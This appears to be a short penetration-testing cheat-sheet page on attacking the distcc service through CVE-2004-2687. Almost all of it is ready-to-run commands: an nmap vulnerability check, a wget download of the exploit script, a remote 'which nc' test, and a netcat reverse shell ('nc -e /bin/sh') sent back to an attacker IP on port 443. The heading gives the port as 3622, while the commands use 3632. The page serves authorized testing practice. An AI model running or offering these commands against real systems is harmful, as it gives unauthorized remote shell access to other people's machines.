---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/penetration-testing/enumeration/service-ports/distcc-3622
---

# Distcc (3622)

## Nmap Script

```basic
nmap --script distcc-cve2004-2687 -p 3632 10.10.10.10
```

## **CVE-2004-2687**

```bash
# Download and store in script driectory
wget https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse -O /usr/share/nmap/scripts/distcc-exec.nse

# Verity the vulnerablity
nmap -p 3632 10.10.10.10 --script distcc-exec --script-args="distcc-exec.cmd='which nc'"

# Running scripte with reverse shell
nmap -p 3632 10.10.10.10 --script distcc-exec --script-args="distcc-exec.cmd='nc -e /bin/sh 10.10.14.24 443'"
```
